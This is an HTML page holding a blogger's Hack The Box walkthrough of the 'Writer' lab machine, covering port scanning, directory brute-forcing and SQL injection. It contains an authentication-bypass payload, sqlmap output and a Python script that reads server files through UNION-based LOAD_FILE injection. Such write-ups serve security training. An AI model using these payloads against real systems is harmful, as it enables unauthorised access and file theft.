<!DOCTYPE html>







<html lang="en" 
  
    mode="dark"
  
>

  <!--
  The Head
-->

<head>
  <meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">

  

    <!-- i18n for `_javascript/utils/timeago.js` -->
    <meta name="day-prompt" content="days ago">
    <meta name="hour-prompt" content="hours ago">
    <meta name="minute-prompt" content="minutes ago">
    <meta name="justnow-prompt" content="just now">

    

    

  

  <!-- Begin Jekyll SEO tag v2.7.1 -->
<meta name="generator" content="Jekyll v4.2.0" />
<meta property="og:title" content="Writer HTB" />
<meta name="author" content="tinyb0y" />
<meta property="og:locale" content="en" />
<meta name="description" content="A very good box with a good knowledge on how postfix filters work and ubuntu apt installer." />
<meta property="og:description" content="A very good box with a good knowledge on how postfix filters work and ubuntu apt installer." />
<link rel="canonical" href="http://0.0.0.0:4000/posts/Writer/" />
<meta property="og:url" content="http://0.0.0.0:4000/posts/Writer/" />
<meta property="og:site_name" content="tinyb0y" />
<meta property="og:type" content="article" />
<meta property="article:published_time" content="2021-12-11T05:30:00+05:30" />
<meta name="twitter:card" content="summary" />
<meta property="twitter:title" content="Writer HTB" />
<meta name="twitter:site" content="@t1nyb0y" />
<meta name="twitter:creator" content="@tinyb0y" />
<meta name="google-site-verification" content="google_meta_tag_verification" />
<script type="application/ld+json">
{"description":"A very good box with a good knowledge on how postfix filters work and ubuntu apt installer.","headline":"Writer HTB","@type":"BlogPosting","dateModified":"2021-12-11T05:30:00+05:30","datePublished":"2021-12-11T05:30:00+05:30","mainEntityOfPage":{"@type":"WebPage","@id":"http://0.0.0.0:4000/posts/Writer/"},"url":"http://0.0.0.0:4000/posts/Writer/","author":{"@type":"Person","name":"tinyb0y"},"@context":"https://schema.org"}</script>
<!-- End Jekyll SEO tag -->


  <title>Writer HTB | tinyb0y
  </title>

  <!--
  The Favicons for Web, Android, Microsoft, and iOS (iPhone and iPad) Apps
  Generated by: https://realfavicongenerator.net/
-->



<link rel="apple-touch-icon" sizes="180x180" href="/assets/img/favicons/apple-touch-icon.png">
<link rel="icon" type="image/png" sizes="32x32" href="/assets/img/favicons/favicon-32x32.png">
<link rel="icon" type="image/png" sizes="16x16" href="/assets/img/favicons/favicon-16x16.png">
<link rel="manifest" href="/assets/img/favicons/site.webmanifest">
<link rel="shortcut icon" href="/assets/img/favicons/favicon.ico">
<meta name="apple-mobile-web-app-title" content="tinyb0y">
<meta name="application-name" content="tinyb0y">
<meta name="msapplication-TileColor" content="#da532c">
<meta name="msapplication-config" content="/assets/img/favicons/browserconfig.xml">
<meta name="theme-color" content="#ffffff">


  <!-- Google Fonts -->
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="anonymous">
  <link rel="dns-prefetch" href="https://fonts.gstatic.com">

  <!-- GA -->
  

  <!-- jsDelivr CDN -->
  <link rel="preconnect" href="https://cdn.jsdelivr.net">
  <link rel="dns-prefetch" href="https://cdn.jsdelivr.net">

  <!-- Bootstrap -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.0.0/dist/css/bootstrap.min.css">

  <!-- Font Awesome -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.11.2/css/all.min.css">

  <!--
  CSS selector for site.
-->

<link rel="stylesheet" href="/assets/css/style.css">


  <link rel="stylesheet"
    href="https://cdn.jsdelivr.net/gh/afeld/bootstrap-toc@1.0.1/dist/bootstrap-toc.min.css">



  <!-- Manific Popup -->
  <link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/magnific-popup@1.1.0/dist/magnific-popup.min.css">



  <!-- JavaScript -->

  <script src="https://cdn.jsdelivr.net/npm/jquery@3/dist/jquery.min.js"></script>

</head>


  <body data-spy="scroll" data-target="#toc">

    <!--
  The Side Bar
-->

<div id="sidebar" class="d-flex flex-column align-items-end" lang="en">
  <div class="profile-wrapper text-center">
    <div id="avatar">
      <a href="/" alt="avatar" class="mx-auto">
        
        <img src="/assets/img/hacker-profile.png" alt="avatar" onerror="this.style.display='none'">
      </a>
    </div>

    <div class="site-title mt-3">
      <a href="/">tinyb0y</a>
    </div>
    <div class="site-subtitle font-italic">Pentester. Hacker. Bug Bounty Hunter.</div>

  </div><!-- .profile-wrapper -->

  <ul class="w-100">

    <!-- home -->
    <li class="nav-item">
      <a href="/" class="nav-link">
        <i class="fa-fw fas fa-home ml-xl-3 mr-xl-3 unloaded"></i>
        <span>HOME</span>
      </a>
    </li>
    <!-- the real tabs -->
    
    <li class="nav-item">
      <a href="/categories/" class="nav-link">
        <i class="fa-fw fas fa-stream ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>CATEGORIES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/tags/" class="nav-link">
        <i class="fa-fw fas fa-tags ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>TAGS</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/archives/" class="nav-link">
        <i class="fa-fw fas fa-archive ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ARCHIVES</span>
      </a>
    </li> <!-- .nav-item -->
    
    <li class="nav-item">
      <a href="/about/" class="nav-link">
        <i class="fa-fw fas fa-info ml-xl-3 mr-xl-3 unloaded"></i>
        

        <span>ABOUT</span>
      </a>
    </li> <!-- .nav-item -->
    

  </ul> <!-- ul.nav.flex-column -->

  <div class="sidebar-bottom mt-auto d-flex flex-wrap justify-content-center">

    
      

      
      <a href="https://github.com/tinyb0y" aria-label="github"
        
        target="_blank" rel="noopener">
        <i class="fab fa-github-alt"></i>
      </a>
      

    
      

      
      <a href="https://twitter.com/t1nyb0y" aria-label="twitter"
        
        target="_blank" rel="noopener">
        <i class="fab fa-twitter"></i>
      </a>
      

    
      

      
      <a href="
          javascript:location.href = 'mailto:' + ['tinyb0y','protonmail.com'].join('@')" aria-label="email"
        
        >
        <i class="fas fa-envelope"></i>
      </a>
      

    
      

      
      <a href="/feed.xml" aria-label="rss"
        
        >
        <i class="fas fa-rss"></i>
      </a>
      

    

    

  </div> <!-- .sidebar-bottom -->

</div><!-- #sidebar -->


    <!--
  The Top Bar
-->

<div id="topbar-wrapper" class="row justify-content-center topbar-down">
  <div id="topbar" class="col-11 d-flex h-100 align-items-center justify-content-between">
    <span id="breadcrumb">

    

    

      

        
          <span>
            <a href="/">
              Home
            </a>
          </span>

        

      

        

      

        

          
            <span>Writer HTB</span>
          

        

      

    

    </span><!-- endof #breadcrumb -->

    <i id="sidebar-trigger" class="fas fa-bars fa-fw"></i>

    <div id="topbar-title">
      Post
    </div>

    <i id="search-trigger" class="fas fa-search fa-fw"></i>
    <span id="search-wrapper" class="align-items-center">
      <i class="fas fa-search fa-fw"></i>
      <input class="form-control" id="search-input" type="search"
        aria-label="search" autocomplete="off" placeholder="Search...">
      <i class="fa fa-times-circle fa-fw" id="search-cleaner"></i>
    </span>
    <span id="search-cancel" >Cancel</span>
  </div>

</div>


    <div id="main-wrapper">
      <div id="main">

        <!--
  Refactor the HTML structure.
-->



<!--
  In order to allow a wide table to scroll horizontally,
  we suround the markdown table with `<div class="table-wrapper">` and `</div>`
-->



<!--
  Fixed kramdown code highlight rendering:
  https://github.com/penibelst/jekyll-compress-html/issues/101
  https://github.com/penibelst/jekyll-compress-html/issues/71#issuecomment-188144901
-->



<!-- Add attribute 'hide-bullet' to the checkbox list -->




<!-- images -->



  <!-- add CDN prefix if it exists -->

  

  

  <!-- lazy-load images <https://github.com/ApoorvSaxena/lozad.js#usage> -->

  

  <!-- add image placehoder to prevent layout reflow -->

  

  

  
    
      
      
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  
    

    
    
    

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    
      
      

      

      

    

    

  

  



<!-- Add lang-badge for code snippets -->




<!-- return -->





<div class="row">

  <div id="post-wrapper" class="col-12 col-lg-11 col-xl-8">

    <div class="post pl-1 pr-1 pl-sm-2 pr-sm-2 pl-md-4 pr-md-4">

      <h1 data-toc-skip>Writer HTB</h1>

      <div class="post-meta text-muted d-flex flex-column">
        <!-- Published date and author -->
        <div>
          <span class="semi-bold">
            tinyb0y
          </span>
          
          <!--
  Date format snippet
  See: /assets/js/_utils/timeage.js
-->






  on

<span class="timeago "
  
    data-toggle="tooltip"
    data-placement="bottom"
    title="Sat, Dec 11, 2021,  5:30 AM +0530"
  >Dec 11, 2021<i class="unloaded">2021-12-11T05:30:00+05:30</i>
</span>

        </div>

        <div>
          <!-- lastmod -->
          

          <!-- read time -->
          <!--
  Calculate the post's reading time, and display the word count in tooltip
 -->



<!-- words per minute  -->










<!-- return element -->
<span class="readtime" data-toggle="tooltip" data-placement="bottom"
  title="3600 words">20 min read</span>


          <!-- page views -->
          

        </div>

      </div> <!-- .post-meta -->

      <div class="post-content">

        

        <h1 id="writer">Writer</h1>
<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210803123741.png" alt="[Pasted image 20210803123741.png]" /></p>

<p>A very good box with a good knowledge on how postfix filters work and  ubuntu <code class="language-plaintext highlighter-rouge">apt</code> installer.</p>

<ul>
  <li>Nmap</li>
  <li>Recon</li>
  <li>SQL Injection</li>
  <li>FootHold</li>
  <li>User escalation</li>
  <li>Root Privilege Escalation</li>
</ul>

<h3 id="nmap">Nmap</h3>
<hr />

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre>PORT    STATE SERVICE     VERSION
22/tcp  open  ssh         OpenSSH 8.2p1 Ubuntu 4ubuntu0.2 <span class="o">(</span>Ubuntu Linux<span class="p">;</span> protocol 2.0<span class="o">)</span>
80/tcp  open  http        Apache httpd 2.4.41 <span class="o">((</span>Ubuntu<span class="o">))</span>
|_http-server-header: Apache/2.4.41 <span class="o">(</span>Ubuntu<span class="o">)</span>
|_http-title: Story Bank | Writer.HTB
139/tcp open  netbios-ssn Samba smbd 4.6.2
445/tcp open  netbios-ssn Samba smbd 4.6.2
Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel

Host script results:
|_clock-skew: <span class="nt">-11s</span>
|_nbstat: NetBIOS name: WRITER, NetBIOS user: &lt;unknown&gt;, NetBIOS MAC: &lt;unknown&gt; <span class="o">(</span>unknown<span class="o">)</span>
| smb2-security-mode: 
|   2.02: 
|_    Message signing enabled but not required
| smb2-time: 
|   <span class="nb">date</span>: 2021-07-31T19:03:13
|_  start_date: N/A

Service detection performed. Please report any incorrect results at https://nmap.org/submit/
</pre></td></tr></tbody></table></code></div></div>

<p>We have four ports open 22, 80, 139 and 445</p>

<p>From the nmap scan we have some information about the server. It is a ubuntu machine.</p>

<p>Let’s explore port 139 and 445 initially and try to find out any information.</p>

<h3 id="recon">Recon</h3>

<h4 id="port-445">Port 445</h4>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210803104107.png" alt="[Pasted image 20210803104107.png]" /></p>

<p>We have a directory and anonymous login is enabled but we don’t have a read permission on the directory <code class="language-plaintext highlighter-rouge">writer2_project</code></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210803104253.png" alt="[Pasted image 20210803104253.png]" /></p>

<h4 id="port-80">Port 80</h4>

<p>We have a web interface on the port 80. Looks like a blog.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210803104556.png" alt="[Pasted image 20210803104556.png]" /></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210803104815.png" alt="[Pasted image 20210803104815.png]" /></p>

<p>Server: ubuntu/apache</p>

<p>Let’s brute force directories and see what all we have</p>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
</pre></td><td class="rouge-code"><pre>____ <span class="nv">$ffuf</span> <span class="nt">-w</span> /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt <span class="nt">-u</span> http://writer.htb/FUZZ <span class="nt">-o</span> out.fuzz

        /<span class="s1">'___\  /'</span>___<span class="se">\ </span>          /<span class="s1">'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v1.3.1-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://writer.htb/FUZZ
 :: Wordlist         : FUZZ: /opt/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Output file      : out.fuzz
 :: File format      : json
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200,204,301,302,307,401,403,405
________________________________________________

contact                 [Status: 200, Size: 4905, Words: 242, Lines: 110, Duration: 1168ms]
about                   [Status: 200, Size: 3522, Words: 250, Lines: 75, Duration: 1184ms]
static                  [Status: 301, Size: 309, Words: 20, Lines: 10, Duration: 301ms]
logout                  [Status: 302, Size: 208, Words: 21, Lines: 4, Duration: 188ms]
dashboard               [Status: 302, Size: 208, Words: 21, Lines: 4, Duration: 304ms]
administrative          [Status: 200, Size: 1443, Words: 185, Lines: 35, Duration: 186ms]
</span></pre></td></tr></tbody></table></code></div></div>

<h3 id="sql-injection">SQL Injection</h3>

<p>We have an administrative login panel.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210803105102.png" alt="[Pasted image 20210803105102.png]" /></p>

<p>I tried a simple sql injection and it worked.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210803105203.png" alt="[Pasted image 20210803105203.png]" /></p>

<p>Payload : <code class="language-plaintext highlighter-rouge">username: admin' or '1' = '1 -- - </code> and password can anything</p>

<p>Logged in as admin</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210803105310.png" alt="[Pasted image 20210803105310.png]" /></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210803105345.png" alt="[Pasted image 20210803105345.png]" /></p>

<p>Only user that exists on the web portal is <code class="language-plaintext highlighter-rouge">admin</code>. So we don;t much information how to get onto the box.</p>

<p>But we have sql injection, Let’s try to injection more payloads and see if we can grab more information.</p>

<p>Let’s capture the post request in burp and save it to file and give the file as input to sqlmap tool.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210803105714.png" alt="[Pasted image 20210803105714.png]" /></p>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
</pre></td><td class="rouge-code"><pre>____ <span class="nv">$cat</span>  req.txt 
POST /administrative HTTP/1.1
Host: writer.htb
User-Agent: Mozilla/5.0 <span class="o">(</span>Windows NT 10.0<span class="p">;</span> rv:78.0<span class="o">)</span> Gecko/20100101 Firefox/78.0
Accept: text/html,application/xhtml+xml,application/xml<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.9,image/webp,<span class="k">*</span>/<span class="k">*</span><span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.8
Accept-Language: en-US,en<span class="p">;</span><span class="nv">q</span><span class="o">=</span>0.5
Accept-Encoding: <span class="nb">gzip</span>, deflate
Content-Type: application/x-www-form-urlencoded
Content-Length: 26
Origin: http://writer.htb
DNT: 1
Connection: close
Referer: http://writer.htb/administrative
Upgrade-Insecure-Requests: 1
Sec-GPC: 1

<span class="nb">uname</span><span class="o">=</span>admin&amp;password<span class="o">=</span>admin
</pre></td></tr></tbody></table></code></div></div>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210803110059.png" alt="[Pasted image 20210803110059.png]" /></p>

<p>Sqlmap gave information about union injectable with 6 columns</p>

<div lang="bash" class="language-bash highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
21
22
23
24
25
26
27
28
29
30
31
32
33
34
35
36
37
38
39
40
41
42
43
44
45
46
47
48
49
50
51
52
53
54
55
56
57
</pre></td><td class="rouge-code"><pre>____ <span class="nv">$sqlmap</span> <span class="nt">-r</span> req.txt <span class="nt">--batch</span>  
        ___
       __H__                      
 ___ ___[<span class="s2">"]_____ ___ ___  {1.5.3#stable}
|_ -| . [,]     | .'| . |             
|___|_  [']_|_|_|__,|  _|
      |_|V...       |_|   http://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 10:58:17 /2021-08-03/

[10:58:17] [INFO] parsing HTTP request from 'req.txt'
[10:58:18] [INFO] testing connection to the target URL
[10:58:19] [INFO] checking if the target is protected by some kind of WAF/IPS
[10:58:19] [INFO] testing if the target URL content is stable
[10:58:19] [INFO] target URL content is stable
[10:58:19] [INFO] testing if POST parameter 'uname' is dynamic
[10:58:20] [WARNING] POST parameter 'uname' does not appear to be dynamic
[10:58:20] [WARNING] heuristic (basic) test shows that POST parameter 'uname' might not be injectable
[10:58:20] [INFO] testing for SQL injection on POST parameter 'uname'
[10:58:20] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[10:58:23] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[10:58:23] [INFO] testing 'MySQL &gt;= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[10:58:25] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[10:58:28] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[10:58:30] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[10:58:32] [INFO] testing 'Generic inline queries'
[10:58:32] [INFO] testing 'PostgreSQL &gt; 8.1 stacked queries (comment)'
got a refresh intent (redirect like response common to login pages) to '/dashboard'. Do you want to apply it from now on? [Y/n] Y
got a 302 redirect to 'http://writer.htb/'. Do you want to follow? [Y/n] Y
[10:58:35] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[10:58:37] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[10:58:39] [INFO] testing 'MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)'
[10:58:51] [INFO] POST parameter 'uname' appears to be 'MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)' injectable 
it looks like the back-end DBMS is 'MySQL'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
for the remaining tests, do you want to include all tests for 'MySQL' extending provided level (1) and risk (1) values? [Y/n] Y
[10:58:51] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[10:58:51] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[10:59:01] [INFO] target URL appears to be UNION injectable with 6 columns
injection not exploitable with NULL values. Do you want to try with a random integer value for option '--union-char'? [Y/n] Y
[11:00:02] [WARNING] if UNION based SQL injection is not detected, please consider forcing the back-end DBMS (e.g. '--dbms=mysql') 
[11:00:02] [INFO] checking if the injection point on POST parameter 'uname' is a false positive
POST parameter 'uname' is vulnerable. Do you want to keep testing the others (if any)? [y/N] N
sqlmap identified the following injection point(s) with a total of 119 HTTP(s) requests:
---
Parameter: uname (POST)
    Type: time-based blind
    Title: MySQL &gt;= 5.0.12 AND time-based blind (query SLEEP)
    Payload: uname=admin' AND (SELECT 6472 FROM (SELECT(SLEEP(5)))vxHz) AND 'rXNj'='rXNj&amp;password=admin
---
[11:00:20] [INFO] the back-end DBMS is MySQL
[11:00:20] [WARNING] it is very important to not stress the network connection during usage of time-based payloads to prevent potential disruptions 
do you want sqlmap to try to optimize value(s) for DBMS delay responses (option '--time-sec')? [Y/n] Y
web server operating system: Linux Ubuntu 19.10 or 20.04 (focal or eoan)
web application technology: Apache 2.4.41
back-end DBMS: MySQL &gt;= 5.0.12 (MariaDB fork)
</span></pre></td></tr></tbody></table></code></div></div>

<p>Let’s try to read a file with sqlmap using the union injection.</p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210803110948.png" alt="[Pasted image 20210803110948.png]" /></p>

<p><img data-proofer-ignore data-src="/assets/images/Pasted image 20210803111047.png" alt="[Pasted image 20210803111047.png]" /></p>

<p>We can read the file but the sqlmap is taking ages to read one line. I cant imagine reading the while file.</p>

<p>So let’s automate which using sleep function  and manually constructing the payload using python</p>

<h3 id="construction-of-payload">Construction of Payload</h3>

<div lang="python" class="language-python highlighter-rouge"><div class="highlight"><code><table class="rouge-table"><tbody><tr><td class="rouge-gutter gl"><pre class="lineno">1
2
3
4
5
6
7
8
9
10
11
12
13
14
15
16
17
18
19
20
</pre></td><td class="rouge-code"><pre><span class="kn">import</span> <span class="nn">requests</span>
<span class="kn">import</span> <span class="nn">binascii</span>
<span class="kn">from</span> <span class="nn">bs4</span> <span class="kn">import</span> <span class="n">BeautifulSoup</span>

<span class="n">URL</span> <span class="o">=</span> <span class="s">"http://writer.htb/administrative"</span>


<span class="k">while</span> <span class="bp">True</span><span class="p">:</span>
	<span class="c1">#payload = b"/etc/passwd"
</span>	<span class="n">payload</span> <span class="o">=</span> <span class="nb">input</span><span class="p">(</span><span class="s">"&gt;"</span><span class="p">).</span><span class="n">encode</span><span class="p">()</span>
	<span class="c1">#convert payload to HEX
</span>
	<span class="n">payload</span> <span class="o">=</span> <span class="nb">str</span><span class="p">(</span><span class="n">binascii</span><span class="p">.</span><span class="n">hexlify</span><span class="p">(</span><span class="n">payload</span><span class="p">).</span><span class="n">decode</span><span class="p">(</span><span class="n">encoding</span><span class="o">=</span><span class="s">"utf-8"</span><span class="p">))</span>

	<span class="n">data</span> <span class="o">=</span> <span class="p">{</span><span class="s">"uname"</span><span class="p">:</span> <span class="s">"admin' UNION ALL SELECT 99, LOAD_FILE(0x"</span><span class="o">+</span><span class="n">payload</span><span class="o">+</span><span class="s">"),99,99,99,99-- -"</span> <span class="p">,</span> <span class="s">"password"</span><span class="p">:</span> <span class="s">"admin"</span><span class="p">}</span>

	<span class="n">r</span> <span class="o">=</span> <span class="n">requests</span><span class="p">.</span><span class="n">post</span><span class="p">(</span><span class="n">URL</span><span class="p">,</span> <span class="n">data</span><span class="o">=</span><span class="n">data</span><span class="p">)</span>
	<span class="n">soup</span> <span class="o">=</span> <span class="n">BeautifulSoup</span><span class="p">(</span><span class="n">r</span><span class="p">.</span><span class="n">text</span><span class="p">,</span> <span class="s">'html.parser'</span><span class="p">)</span>
	<span class="n">p</span> <span class="o">=</span> <span class="n">soup</span><span class="p">.</span><span class="n">find</span><span class="p">(</span><span class="s">'h3'</span><span class="p">)</span>
	<span class="k">print</span><span class="p">(</span><span class="n">p</span><span class="p">.</span><span class="n">text</span><span class="p">)</span>
</pre></td></tr></tbody></table></code></div></div>

